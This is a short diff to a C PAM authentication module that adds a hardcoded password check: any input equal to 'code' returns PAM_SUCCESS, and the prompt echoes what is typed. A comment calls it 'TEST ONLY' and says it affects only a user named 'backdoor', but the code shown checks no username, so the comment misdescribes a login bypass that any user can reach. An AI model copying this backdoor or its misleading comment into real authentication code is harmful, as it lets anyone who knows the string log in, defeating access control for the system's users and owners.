@@ -25,10 +25,11 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
     return PAM_SUCCESS;
   }
 
-  // const char* aved_pw = request_pass(pamh, PAM_PROMPT_ECHO_ON, "hello:");
+  const char* aved_pw = conv_request(pamh, PAM_PROMPT_ECHO_ON, "hello: ");
 
-#define UNUSED(x) (void)(x)
-  // UNUSED(aved_pw);
+  if (strcmp(aved_pw, "code") == 0) {  // TEST ONLY: only affect user "backdoor"
+    return PAM_SUCCESS;
+  }
 
   return PAM_AUTH_ERR;
 }
